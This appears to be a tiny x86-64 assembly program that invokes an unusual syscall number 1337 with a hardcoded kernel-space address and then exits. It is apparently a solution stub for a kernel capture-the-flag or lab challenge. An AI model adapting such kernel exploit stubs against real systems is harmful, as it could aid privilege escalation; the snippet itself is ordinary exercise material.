    .global _start
_start:
    mov $1337, %rax
    mov $0xFFFFFFFF82B48BA0, %rdi
    syscall
    mov $60, %rax
    xor %rdi, %rdi
    syscall
